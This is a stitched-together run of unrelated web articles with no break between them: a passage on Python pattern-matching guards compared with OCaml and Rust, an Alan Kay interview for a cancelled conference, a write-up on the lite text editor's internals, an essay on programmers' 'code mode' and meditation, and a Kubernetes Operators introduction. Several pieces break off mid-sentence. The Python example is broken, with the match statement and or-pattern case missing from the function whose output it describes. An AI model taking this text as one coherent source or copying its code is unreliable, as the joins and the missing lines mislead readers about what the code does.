<p>In the above example, <code>if age % 2 == 0</code> and <code>if sorted(name) == list(name)</code> are pattern guards that allow that case to be taken only if that boolean expression evaluates to True.</p>

<h2 id="the-surprising-interaction">The surprising interaction</h2>

<p>What do you think this function does?</p>

<div><div><pre><code><span>def</span> <span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>

      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>5</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>5</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints False (?????)
</span></code></pre></div></div>

<p>The last one (<code>doesEitherCatHaveAnEvenAge(Cat(5), Cat(4))</code>) may seem like it should evaluate to True. After all, the one of the patterns in the or-pattern seems like it matches the second cat, which is a cat with an even age.</p>

<p>Does <code>(Cat(5), Cat(4))</code> match against <code>(Cat(age=age), _) | (_, Cat(age=age)) if age % 2 == 0</code>? To answer this question, the semantics in your head might look something like this:</p>

<ol>
  <li>Well, <code>(Cat(5), Cat(4))</code> does match agains the first pattern of the or-pattern, <code>(Cat(age=age), _)</code>. This match binds the value 5 to the variable <code>age</code>.</li>
  <li>Now we check the guard <code>if age % 2 == 0</code>. Because <code>5 % 2 == 0</code> evaluates to False, this check fails.</li>
  <li>Go back to the or-pattern and see if there’s any other way to match it. In this case, <code>(Cat(5), Cat(4))</code> also matches the second pattern of the or-pattern, <code>(_, Cat(age=age)</code>. This binds the value 4 to the variable <code>age</code>.</li>
  <li>Now the guard <code>if age % 2 == 0</code> succeeds, because <code>4 % 2 == 0</code> evaluates to <code>True</code>.</li>
  <li>Because this case matches the value, we return True.</li>
</ol>

<p>This is perfectly sensible, but this is not what the implementation does. The implementation’s semantics are more like this:</p>

<ol>
  <li>Same as step 1 from above.</li>
  <li>Same as step 2 from above.</li>
  <li>Because the guard failed, the case isn’t taken! Instead, the next case is tried. This case (<code>case _:</code>) always succeeds, so we return False.</li>
</ol>

<p>In other words, pattern matching does’t have backtracking semantics, even if a value can match an or-pattern in multiple different ways.</p>

<p>I love pattern matching, and I’m excited to see that it might be adopted by such a popular language as Python. But this particular interaction of features might confuse novices. Let’s compare the approaches of other languages.</p>

<p>OCaml has the same semantics as Python here, but the OCaml compiler can emit a warning (because the compiler has enough type information to figure out whether the constituent patterns of an or-pattern can possibly match the same value in different ways).</p>

<div><div><pre><code><span>let</span> <span>()</span> <span>=</span>
  <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>with</span>
  <span>|</span> <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>when</span> <span>x</span> <span>=</span> <span>2</span> <span>-&gt;</span> <span>print_endline</span> <span>":)"</span>
  <span>|</span> <span>_</span> <span>-&gt;</span> <span>print_endline</span> <span>":("</span>
<span>;;</span>
</code></pre></div></div>

<p>This prints <code>:(</code>, but also emits the warning:</p>

<div><div><pre><code>Warning 57: Ambiguous or-pattern variables under guard;
variable x may match different arguments. (See manual section 9.5)
</code></pre></div></div>

<p>Rust has pattern matching and guards, and has an experimental <code>or_patterns</code> feature. It implements backtracking semantics, unlike Python. This is weird in its own right, especially in the presence of side effects. Take a look at this program:</p>

<div><div><pre><code><span>#![feature(or_patterns)]</span>

<span>// Prompt the user whether they want to accept the match</span>
<span>pub</span> <span>fn</span> <span>check</span><span>(</span><span>x</span><span>:</span> <span>i32</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>

    <span>println!</span><span>(</span><span>"Checking this match: {}. Should we accept it? y/n"</span><span>,</span> <span>x</span><span>);</span>
    <span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>
    <span>stdin</span><span>()</span><span>.read_line</span><span>(</span><span>&amp;</span><span>mut</span> <span>s</span><span>)</span><span>.expect</span><span>(</span><span>"Did not enter a correct string"</span><span>);</span>
    <span>return</span> <span>s</span><span>.trim</span><span>()</span> <span>==</span> <span>"y"</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>{</span>
        <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>if</span> <span>check</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":)"</span><span>)</span>
        <span>}</span>
        <span>_</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":("</span><span>)</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In particular, the guard can now run multiple times:</p>

<div><div><pre><code>$ cargo +nightly run
Checking this match: 1. Should we accept it? y/n
n
Checking this match: 2. Should we accept it? y/n
y
:)
</code></pre></div></div>

<p>I’m not sure what the right decision is for Python. Or-patterns and guards may just not compose well.</p>

<p>This summer we were due to hold our XT20 conference, which was going to focus on
how we could bring some of the approaches of the past to tackle the challenges
of the present and the future. Unfortunately, one of these future challenges
arrived, and we had to make the difficult decision to cancel the event.</p>
<p>Alan Kay was one of the leading researchers at the legendary labs of ARPA and
Xerox PARC in the 1960s and 1970s. We wanted to understand from Alan how Xerox
PARC came to be, and how could possibly reproduce what happened there, to make
similar leaps for our industry in the future.</p>
<p>When we held our XT16 conference, we made short videos with all of our speakers
to introduce their talks, and we wanted to continue this tradition with XT20. So
prior to the cancellation, we recorded a short piece with Alan to introduce the
content of his talk.</p>
<p>Alan stresses that we’re only just at the start of our industry and
that we’ve a long way to go. As he puts it, many of great ideas from
the 1960s and 1970s are still landing, before we consider the new
ground-breaking ideas that are yet to be found. To find those ideas,
we need to seek out the brightest among us, and then we have to figure
out how to fund and manage them properly.</p>
<div>
<p>
<iframe width="300" height="300" src="https://www.youtube.com/embed/Q6Ly4gSfAoo?rel=0" frameborder="0" allowfullscreen=""></iframe>
</p>
</div>
<div>
<blockquote>
<p>I got asked to give a talk at XT20 because I was one of the researchers and a
leader of a research group in the ARPA and Xerox combined research community in
the sixties and the seventies that invented many of the technologies that are in
use today including the ones that we’re using right now, these include: Personal
Computing; The Graphic User Interface; Ethernet; The Internet; Laser Printing;
Client/Server computing, and a host of other ones.</p>
<p>And so this was not just a series of inventions but was actually the creation of
several really large industries that have, according to the Wall St. Journal,
have returned about 45 trillion (US dollars) to the world, and the four largest
capital net-worth companies in America all used, are based on, these
technologies, so besides being good ideas, besides being something that can
boost human intellect and can deal with much more complicated situations, it
also has been a tremendous commercial success far beyond normal R&amp;D efforts.</p>
<p>One point of interest, I think, to people is that despite this, <strong>no country or
company or Univerisity is willing to fund such an effort!</strong>. The key is: can you
get the right people, and can you set up something that allows the researchers
and the right researchers to do the kind of stuff that normally was only done
when countries felt that they were in the middle of a war.</p>
<p>That’s the second point, there have been many such efforts, successful efforts,
such as ARPA and Xerox PARC in the past, especially in the US, and the Cold War,
and then back in WWII, and the particular way of going about it actually traces
back to the combined joint work of the UK and the US in developing Radar for
WWII. There’s a direct link in the methodologies used back then, and to an
extent in projects that are not so directly involved such as Bletchley Park (in
the UK) and Los Alamos and the Atomic Bomb effort (in the US).</p>
<p>So I think what will be of interest to the people who go to this conference will
likely be the idea first that it really can be done, and <em>has</em> been done (more
than once).</p>
<p>Most normal regular people are quite against taking what seems to be a huge risk
but in fact, the pay-off from these risks, which is actually only been a few
hundred million (GB) pounds or so, has been in the trillions!</p>
<p>So if you count up all the zeros the return on investment is not 15% but more like 20,000%,
so it actually would make good business sense for people to take these kinds of
risks, but that isn’t the way business people think. And so this is, I think, a
really interesting area to explore and that’s what I will at least open the
door to in my talk.</p>

<p>2020.06.04</p>
<p>updated: 2020.06.06</p>



<p>
  This write-up outlines some of the implementation details of the
  <a href="http://github.com/rxi/lite">lite</a> text editor. At the time of writing
  this lite is version <a href="https://github.com/rxi/lite/releases/tag/v1.06">1.06</a>.
</p>


<p>
  Lite is written mainly in Lua (5.2) with the lowest level parts written in C.
  It is written with the intent of being lightweight, easy on the eyes,
  responsive and trivial to modify and extend. To achieve this the core
  implementation aims to be <em>as simple as possible</em>: complexity is only
  brought in when it's proven the simplest method isn't practical.
</p>



<p>
  The core of lite implements documents, syntax highlighting, a
  cooperative-threading system, basic logging and the general ui layout system.
  Overall the core is in charge of handling user input, running per-frame tasks,
  and rendering the resultant frame early enough to meet the frames-per-second
  specified in <code>config.fps</code>.
</p>



<p>
  Lite implements a cooperative-threading system where by background tasks —
  such as full-document syntax highlighting and updating the internal list of
  project files — can be performed incrementally. Cooperative threads in lite are
  implemented using lua's coroutines and are referred internally as simply
  <code>threads</code>.
</p>
<p>
  A thread can be started by using the <code>core.add_thread()</code> function, this
  function takes a function, and an optional object which is used as a weak
  reference to that thread, eg. if a doc is passed as the weak reference, when
  that doc is garbage collected the coinciding thread will also cease to exist.
</p>
<p>
  As threads in lite are cooperative they're expected to regularly call
  <code>couroutine.yield()</code>. Typically this yielding is done every <code>n</code>
  lines for line-based tasks (eg. full-project search, syntax highlighting).
  When a thread yields the core will continue to render the frame, or — if there is
  still enough time left in the current frame — pass control to another thread.
  Threads can also pass a numerical argument to <code>coroutine.yield()</code> to wait
  for the number of seconds specified:
</p>
<pre>core.add_thread(function()
  -- print "hello world" every 10 seconds
  while true do
    print("hello world")
    coroutine.yield(10)
  end
end
</pre>
<p>
  Practical usage examples of lite's threading can be seen in the core's project
  file scanning (<code>data/core/init.lua</code>) and the incremental syntax highlighting
  (<code>data/core/doc/highlighter.lua</code>).
</p>


<p>
  All loaded text files in lite are stored in <code>Docs</code>. A doc keeps a table
  of a text file's lines (<code>Doc.lines</code>), undo and redo
  state, the current syntax (<code>Doc.syntax</code>), syntax highlighting state
  (<code>Doc.highlighter</code>) and caret/selection state. Docs are opened using the
  <code>core.open_doc()</code> function; if the function is called and a doc of that
  filename is already open then the existing doc is returned such that
  more-than-one doc representing the same file should never be present.
</p>
<p>
  Lite stores all the open docs in the <code>core.docs</code> table; each frame lite
  checks the number of views referencing each doc and releases those with zero
  references — this is an instance of lite favoring polling over callbacks or
  event listeners. This approach is done throughout lite; in avoiding event
  listeners we also avoid having to manage unregistering event handlers or worry
  about having those which are never unregistered through error. This leads to
  much simpler, less error-prone code.
</p>

<p>
  Lite implements a simple syntax highlighter based around lua patterns, this is
  split up into 3 parts:
</p>
<ul>
  <li><code>core.syntax</code>: stores language syntax specifications</li>
  <li><code>core.tokenizer</code>: converts text into table of tokens using a given syntax</li>
  <li><code>core.doc.highlighter</code>: stores token state for lines of a doc and handles
         full-document incremental highlighting</li>
</ul>
<p>
  A language syntax is stored as a table of lua patterns mapped to to their
  resultant token type (<code>.patterns</code>) and a table of symbols mapped to their
  token type (<code>.symbols</code>). Patterns in the pattern table can also be a
  range of the following format:
</p>
<pre>{ range_start_pattern, range_end_pattern [, escape_character] }
</pre>
<p>
  Ranges can be used for matching strings:
</p>
<pre>{ '"', '"', '\\' }
</pre>
<p>
  An example of syntax specifications can be seen in any of the
  <code>data/plugins/language_*.lua</code> files.
</p>
<p>
  The highlighter persists range state between lines by storing the pattern
  table index of the current range. As the highlighter works in increments of
  lines, ranges are useful for multi-line comments or strings which a single
  pattern would fail on.
</p>
<p>
  When the <code>tokenizer.tokenize()</code> function is called it iterates the syntax's
  pattern table from top to bottom, such that patterns higher up in the table
  take precedence. When it matches a pattern it pushes the token to the
  resultant table, if the token's content matches any of the keys in the
  <code>.symbols</code> table that value is used instead of the matched token value;
  this acts both as a more convenient way of specifying keywords as well as an
  optimization as the tokenizer can attempt matching fewer patterns, even if
  there are many keywords specified. The function returns a <code>state</code> integer
  which is used to indicate which pattern range it is currently inside if it is
  inside any.
</p>
<p>
  <code>core.doc.highlighter</code> is in charge of providing tokenized lines when
  displaying a document; each doc stores a <code>Highlighter</code> object. The
  highlighter assures highlighting information for any line that is requested
  is <em>always</em> available, even if the full-document incremental highlighter
  has not yet reached that line.
</p>
<p>
  When a request is made to the highlighter for a specific line the highlighter
  first checks its cache for the line; if it does not have the line cached —
  or, if the line's text has changed since its cached version — it immediately
  tokenizes the line, continuing from the tokenizer state left from the
  previous line. The highlighter's <code>max_wanted_line</code> field is set to
  that line's value if it's greater than the existing <code>max_wanted_line</code>.
</p>
<p>
  A doc's highlighter creates a thread when it's created which it uses to do
  full-document highlighting starting from its <code>first_invalid_line</code> up
  until the <code>max_wanted_line</code>. When a change occurs in a document the
  <code>first_invalid_line</code> is set to the first line of the change if it's
  greater than the current <code>first_invalid_line</code>.
</p>
<p>
  This implementation results in the following characteristics:
</p>
<ul>
  <li>Displayed lines are always syntax highlighted with, at the very
         least, highlighting which is valid to the current screen's content</li>
  <li>Displayed lines are <em>eventually</em> highlighted with
         full-document aware highlighting</li>
  <li>The highlighting is performed per-line, and so — with the exception
         of extremely long lines — can be done incrementally without a
         negative effect on responsiveness</li>
  <li>Highlighting is only performed up until the point in the document it
         is required, for example, up until the last visible line</li>
</ul>



<p>
  Each part of lite's UI is implemented as a <code>View</code>, that is, a document is
  shown in the UI as a <code>DocView</code>, the status bar at the bottom the
  <code>StatusView</code> etc. Each view exists within the <code>RootView</code>
  (<code>core.root_view</code>) which is in charge of calling the <code>:update()</code> and
  <code>:draw()</code> functions of each view, managing the layout of the
  views, and routing user input to relevant views.
</p>
<p>
  The rootview is implemented as a binary tree of <code>Nodes</code>. Each node is one
  of the following types:
</p>
<ul>
  <li><code>hsplit</code>: Contains two children side-by-side and a divider between them</li>
  <li><code>vsplit</code>: Contains two children one-above-the-other and a divider between them</li>
  <li><code>leaf</code>: Contains one or more views, and, if there is more than one
        view, a tab at the top for each view.</li>
</ul>
<p>
  Each frame the rootview calculates its layout based on the divider position of
  each split and sets the <code>.size</code> field of each node and view accordingly.
</p>
<p>
  The rootview also has a concept of <em>locked nodes</em>; the size of a locked
  node is not determined by the divider position but instead is set from the
  view's <code>.size</code> field. Locked nodes cannot be resized by the user as
  normal nodes would be, they cannot be closed and cannot open additional views.
  The locked-node feature is used for, amongst other things, the status bar at the
  bottom of the screen which we typically want to be always present and
  immutable.
</p>
<p>
  lite takes the approach of effectively redrawing <em>everything</em> whenever
  it needs to redraw <em>anything</em>, this lends itself to simplified UI code.
  There are no event listeners or callbacks to manage. If something changes the
  state of the UI (eg. the caret is moved), the <code>core.redraw</code> boolean is set
  to <code>true</code> to signify that something has changed and the UI is redrawn on
  that frame. For further simplicity any user input events will also set
  <code>core.redraw</code>, such that there's a guarantee any change which resulted from
  user input will result in the screen contents being updated.
</p>
<p>
  Although the idea of redrawing everything each time may appear wasteful, lite
  employs a technique where by only regions of the screen which have changed
  between frames are actually redrawn — these regions can be displayed by calling
  <code>renderer.show_debug(true)</code>. This technique is implemented on the C level
  of the code and is invisible to the lua portion which acts as if it's doing
  a full redraw each time.
</p>
<p>
  An overview of how this is achieved is detailed in the
  <a href="https://rxi.github.io/cached_software_rendering.html">Cached Software Rendering</a> write-up.
</p>



<p>
  Lite's plugin system is based around lua's module system; each plugin is
  simply a lua module (that is, a single <code>.lua</code> file, or, a directory
  containing a <code>init.lua</code> file). All modules in the <code>data/plugins</code>
  directory are automatically loaded when lite starts — this is done after
  initializing the core and before loading the user and project modules. Thus to
  install a plugin you simply place the file in the plugins directory; to
  uninstall a plugin you delete the file.
</p>
<p>
  A specific order of which plugins are loaded is not guaranteed by lite but,

Once this script is ran you should be able to type anything less than 32 bytes. This tends to be at most 32 characters, but depending on the size of the Unicode characters used it can be much less. For instance the fire emoji, <code>🔥</code>, is actually 4 bytes because of how UTF-8 works. This means that only 8 fire emojis could be used.

    <h2>Code Mode</h2>

<p>It's been a wild week. You and your team have been engaged in an all-out war with the codebase for the past two spints. There's this new integration with a partner that's close to being shipped, and it promises bountiful revenue and voluminous web traffic. And you've been working on the part of it that'll seal the deal and let your squad deploy, come Monday morning.</p>

<p>You find yourself on the Friday night before launch, 6pm, absolutely fried at your desk. Everyone else on your team already left to attend the company happy hour, or has gone home seeking sanity from work. For the past several hours, you've been tracking down a nasty, horrendous bug that could prevent the feature from shipping next week.</p>

<p>But you introduced it.</p>

<p>Caught late in the game, with the marketing team eager to deploy, there were no other options. Thankfully, you're close to patching things up. Your thoughts have been a web of abstractions all night, looking something like this:</p>

<ul>
<li>I've looked at <code>SuperClass</code>, but the stack trace is from <code>ChildClass</code>.</li>
<li>Alright, so <code>ChildClass</code> imports the function from <code>HelperModule</code>...</li>
<li><code>HelperModule</code> uses a bunch of functions from <code>CrazyLibrary</code>. Let's do a search. Great, <code>CrazyLibrary</code> has no documentation.</li>
<li>Wait, did I check out the latest <code>master</code> yet?</li>
<li>Oh wait, the error wasn't actually on the server. Let's look at the client.</li>
<li><code>HugeReactComponent</code> is making the call. Maybe the <code>type</code> is wrong?</li>
<li>Oh man, it uses <code>DatabaseModernClientApi</code>... I don't know <code>DatabaseModernClientApi</code>.</li>
<li>Wait no, it's in <code>MiddlewareClientServer</code>...</li>
</ul>

<p><img src="https://miro.medium.com/max/2560/0*UxR4_Op7AExQz-Oo.png"></p>

<p>At 7:30pm, you're sure you've nailed it. It was a silly conditional that got in the way. Boom, problem solved. After merging a PR that switched the broken ternary statement around, off to the happy hour you go.</p>

<p>Beaming with pride from merging the bug fix, you walk in, and notice your team chatting with folks from a sister team. You recognize some members of the sister team, but not everyone. You go and try to introduce yourself.</p>

<blockquote>
<p>"Hey y'all, what's happening?!"</p>
</blockquote>

<p>Both your team and the sister team sheepishly smile at you. "Hey man", one of them says, "long day?" You look around, and suddenly notice that some people have startled looks on their faces. Then you realize they had been having a low-key conversation, and that you'd jumped into the conversation at quite the high decibel.</p>

<blockquote>
<p>"Yeah, haha", you play it off, "Oh boy, working on the <code>PartnerIntegrationProject</code> this week was awful! Whoever wrote <code>SuperClass</code> created a complete mess. Must've taken 10 hours away from my life."</p>
</blockquote>

<p>Everyone in the circle stops smiling. Eric, who wrote that class, nervously chuckles. "Yeah, I guess it could be better, huh?" Oops. Bad move. You feel the energy drain out of the conversation they were having.</p>

<p>You stay silent for the next half hour or so, and everyone keeps chatting, but it <em>feels</em> weird. You keep noticing people's expressions and body language. There's some more forced conversation before a few folks excuse themselves. Then everyone disperses.</p>

<p>And for the rest of the evening, you can't shake off the feeling that everyone's thinking something about you. That you did something wrong. You get a sense that the energy was off, and blame yourself.</p>

<p>But you're not to blame! Everything was probably fine, and no one was judging you. You were just in <strong>code mode</strong>.</p>

<h2>What Happens In Your Brain When You Program?</h2>

<p>Ask any developer, and "code mode" is a real thing. We seem to be so drawn into our innermost thoughts of <code>classes</code>, <code>modules</code>, <code>syntax</code>, and <code>systems</code>-- that we lose track of how to mentally function the rest of the time. Some call it "monkey mind" or restlessness, but we all recognize it. It's the brain on hyperdrive, going 200 miles per hour when the speed limit's about 50.</p>

<p>It's the thinking, or rather, <em>the overthinking</em>, that is almost always unnecessary. And for reasons unbeknownst, this always tends to happen when we need to deal with other people.</p>

<p><img src="https://i.imgur.com/95NZpPy.png"></p>

<p>Now, that doesn't seem problematic, right? Being stuck in code mode is harmless. So you overthink the occasional small talk session, and can't really pay attention to long films, but is it really harmful?</p>

<p>No, not really. But understanding why it happens helps us understand how to make the gear switch a little bit smoother, which is behind my upcoming pitch for meditation. If you're able to leave the programmatic thought patterns behind anytime you'd like, you have greater control over your life.</p>

<p>Of course, we want to be sure of our assumptions. After all, the argument for meditation requires a somewhat well-formed paradigm of what's happening when we read and write code. It's important to take into account exactly which thought patterns we "execute" <strong>while</strong> in code mode.</p>

<h2>What's Going On Up There?</h2>

<p>There was a push in recent years to allow programming to replace the study of a foreign language. Around that time, <a href="https://par.nsf.gov/servlets/purl/10085745%20conducted%20a%20study%20that%20observed%2017%20participants%20in%20an%20fMRI%20scanner" rel="nofollow" target="_blank">Norman Peitek, Janet Siegmund, and a team of researchers</a> while they were comprehending short source-code snippets. Their key finding was that despite the stereotype of math and logic being the major concern in programming, the brains of the participants showed greater activation of its language centers than expected.</p>

<p>Now, this may be confusing to you, as it seemingly contradicts <em>the idea of code mode</em>. After all, if the language centers are activated, shouldn't we, as social beings who communicate through the use of language, not be affected by these lingering cognitive thought patterns?</p>

<p>This could be so. But if we dig deeper into the results of the sudy, we actually find that the programmer mind is activated more traditionally than the above finding would suggest:</p>

<blockquote>
<p>In essence, we found five relevant activation clusters, all in the left hemisphere.</p>
</blockquote>

<p>The function of the left hemisphere is thought to be for control of the right side of the body, and "is the more academic and logical side of the brain". The right hemisphere is associated with creativity, visual/spatial perception, and emotional management and expression.</p>

<p>Because this <a href="https://now.northropgrumman.com/the-left-brain-right-brain-myth-is-it-true/" rel="nofollow" target="_blank">has been disputed recently</a>, I took a look at what naysayers of the "left-brain, right-brain myth" were saying. It turns out, most of the rejection of this "myth" stems from the fact that <em>people are not usually left-brain or right-brain dominant</em>. However, the fact of the matter is, the left hemisphere is <strong>still associated</strong> with logical operations and analytical functions, and the right with more "emotional" or "creative" activities.</p>

<blockquote>
<p>In fact, a 2013 University of Utah study on brain lateralization examined the brains of more than 1,000 people and found no evidence for people having a dominant side of the brain. <em>Even though each side of the brain does more work for certain functions</em>, such as language being localized on the left and attention on the right, this doesn’t vary by person. All of the study participants, whether they were engineers or musicians, used their entire brain equally, debunking the left-brain right-brain myth.</p>
</blockquote>

<p>In addition to programming being left hemisphere dominant, there's also a lot going on. The earlier study referenced found that the activated regions while coding found were:</p>

<ol>
<li>Middle frontal gyrus (division of attention, silent word reading, verbal/numeric problem solving)</li>
<li>Middle temporal gyrus (categorization)</li>
<li>Inferior parietal lobule (verbal/numeric problem solving)</li>
<li>Inferior frontal gyrus (verbal/numeric)</li>
<li>Inferior frontal gyrus (silent word reading, problem solving)</li>
</ol>

<p>If this sounds like a surprisingly high amount of brain activity merely for <em>understanding source code</em>, I would agree. And if it sounds like you'd be surprised if all this happened when trying to sleep or talking to a friend, you'd probably be right. Thus, I'd argue that one should choose to believe that quite a bit is going in mentally when we program, and mostly in the left hemisphere.</p>

<h2>But Isn't It Fun?</h2>

<p>An interesting note to add is that this kind of intensive brain activity sounds painful in a challenging way, but is actually desirable. Many call it the "flow" state. Courtland Allen and Vincent Woo <a href="https://www.indiehackers.com/podcast/041-vincent-woo-of-coderpad" rel="nofollow" target="_blank">talked about it in their interview on IndieHackers</a>:</p>

<p>Courtland says:</p>

<blockquote>
<p>That's funny because it reminds me of the first two years after I moved to San Francisco. I started a startup and I basically just coded for sixteen hours a day, every day for two years, and the problem is that if you're in flow for that long and you don't vary your activities... you don't make new memories, everything just blurs together, so I have a two year block of time in my life where there were zero memories, and I swore that I would never do that again.</p>
</blockquote>

<p>To which Vincent replies:</p>

<blockquote>
<p>That's kind of what I suspected happened to that sixty year old plus guy at Amazon, I think he just sat down to code one day and then he woke up, and he was sixty. I don't know, I think flow is both really seductive and also kind of boring in it's own way.</p>
</blockquote>

<p>A fascinating take-away of the above conversation is the conflation of two different ideas: <code>flow</code> state and <code>code mode</code>. From our good friend, <a href="https://en.wikipedia.org/wiki/Flow_(psychology)" rel="nofollow" target="_blank">Wikipedia</a>:</p>

<blockquote>
<p>In positive psychology, a flow state, also known colloquially as being in the zone, is the mental state in which a person performing an activity is fully immersed in a feeling of energized focus, full involvement, and enjoyment in the process of the activity.</p>
</blockquote>

<p>Here, I argue this point, and I want to be succint: <code>flow</code> and <code>code mode</code> appear to be two sides of the same coin. That specific coin is neurotransmitter-fueled activity, causing us to hone in one problem (or consecutive problems) for an indefinite period of time. However, we generally use the term <code>flow</code> to refer to the good parts of it, and I'm using <code>code mode</code> as the detrimental aspect.</p>

<p>I think we'd all agree that <a href="https://algodaily.com/lessons/solving-the-health-problems-of-software-engineers" rel="nofollow" target="_blank">16 hours spent on something is not good for your health</a>, mentally or physically. Especially <a href="https://www.amazon.com/gp/product/0321751043/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=algodaily03-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0321751043&amp;linkId=6fb078bf069b7f8eb648902d5923ab87" rel="nofollow" target="_blank">the art of programming</a>-- your back aches, your eyes burn, and you leave the coding session feeling unsatisfied. This is what we want to avoid, and the mental fatigue this imparts on you will carry over to other parts of life.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Have you ever wondered how effective Site Reliability Engineering (SRE) teams manage complex applications successfully? In the Kubernetes ecosystem, there is only one answer: Kubernetes Operators! In this article, we will examine both what they are and how they work.</p><div><p>The Kubernetes Operator concept was developed by engineers at CoreOS in 2016 as an advanced and native way of building and driving every application on the Kubernetes cluster, which needs domain-specific knowledge. It provides a consistent approach to handle all application operational processes automatically, without any human reaction via close cooperation with the Kubernetes API. In other words, an operator is a way of packaging, running, and managing Kubernetes applications.</p><p>The Kubernetes Operator pattern acts in accordance with one of the core Kubernetes principles: <a href="https://en.wikipedia.org/wiki/Control_theory">the control theory</a>. In robotics and automation, it is a mechanism that continuously operates dynamical systems. It relies on an ability to quickly tailor the workload demand to the available resources as accurately as possible. The objective is to develop a control model with the necessary logic to help an application or system remain stable. In Kubernetes world, that part is handled by controllers.</p><p>A controller is a special software that, in the loop, responds to changes and performs adaptation actions in the cluster. The first Kubernetes controller was a kube-controller-manager. It is regarded as an ancestor for all operators, which were built later.</p><h2 id="what-is-a-controller-loop">What Is a Controller Loop?</h2><p>To put it simply, controller loops are the base of controller actions. Imagine there is a non-terminating process (called a reconciliation loop, in Kubernetes) happening over and over again, as in the following illustration:</p><a href="#kubernetes-operators-reconciliation-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-reconciliation-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/4d00a0df53a752d79d89dbdf5f9da2b36f5167b3/b8cdc/img/blog/kubernetes-operators-reconciliation-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>This process observes at least one Kubernetes <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/#kubernetes-objects">object</a>, which contains information about the desired state. Objects such as …</p><ul><li>Deployments,</li><li>Services,</li><li>Secrets,</li><li>Ingress,</li><li>Config Maps,</li></ul><p>… are defined by configuration files made up of manifests in JSON or YAML. Then the controller(s) makes a continuous adjustment via Kubernetes API to imitate the desired state until the current state becomes the desired state, according to the built-in logic.</p><p>In that way, Kubernetes deals with the dynamic nature of Cloud Native systems, by handling a constant change. Examples of modifications perform to achieve expected state include:</p><ul><li>Noticing when nodes go down and demanding a new one.</li><li>Checking if pods need to be replicated.</li><li>Creating a new load-balancer, if requested.</li></ul><h2 id="how-does-a-kubernetes-operator-work">How Does a Kubernetes Operator Work?</h2><p>An operator is an application-specific controller. It extends a Kubernetes API to create, configure, and manage complex applications on behalf of humans (operation engineers or site reliability engineers). Let’s see what Kubernetes documentation says about it.</p><blockquote><p><em>Operators are software extensions to Kubernetes that make use of custom resources to manage applications and their components. Operators follow Kubernetes principles, notably the control loop.</em> - <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/operator/">Kubernetes Documentation</a></p></blockquote><p>So far, you know that operators take advantage of controllers that observe Kubernetes objects. These controllers are a bit different because they are tracing custom objects, often called custom resources (CR). CR is an extension of the Kubernetes API that provides a place where you can store and retrieve structured data—the desired state of your application. The whole principle of operation is presented in the diagram below.</p><a href="#kubernetes-operators-controller-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-controller-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/63c39aec0db28d70ff470c5aec042c5301b8bc3e/93486/img/blog/kubernetes-operators-controller-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>The Operator continuously tracks cluster events relating to a specific type of custom resource. The types of events on these custom resources that can be tracked are:</p><ul><li>Add,</li><li>Update,</li><li>Delete.</li></ul><p>When the operator receives any information, it will take action to adjust the Kubernetes cluster or external system to the desired state as part of its reconciliation loop in the custom controller.</p><h2 id="how-to-add-a-custom-resource">How to add 